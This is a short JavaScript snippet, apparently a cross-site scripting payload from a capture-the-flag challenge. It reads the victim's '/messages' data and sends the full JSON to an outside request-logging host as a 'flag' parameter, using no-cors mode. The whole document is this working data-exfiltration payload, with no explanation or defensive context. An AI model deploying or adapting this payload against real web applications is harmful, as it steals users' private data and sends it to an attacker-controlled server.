fetch('/messages')
  .then(r => r.json())
  .then(d => fetch('https://3lci41w1.requestrepo.com/log?flag=' + encodeURIComponent(JSON.stringify(d)), { mode: 'no-cors' }));
